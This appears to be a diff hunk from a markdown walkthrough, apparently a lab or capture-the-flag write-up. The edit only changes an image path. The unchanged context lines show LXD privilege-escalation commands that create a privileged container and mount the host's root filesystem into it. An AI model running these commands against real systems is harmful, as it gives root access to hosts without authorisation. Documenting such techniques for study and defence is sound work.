@@ -1923,7 +1923,7 @@ lxc image list
 lxc init alpine privesc -c security.privileged=true
 ```
 
-![enum result](Assets/112.png)
+![enum result](112.png)
 
 ```
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
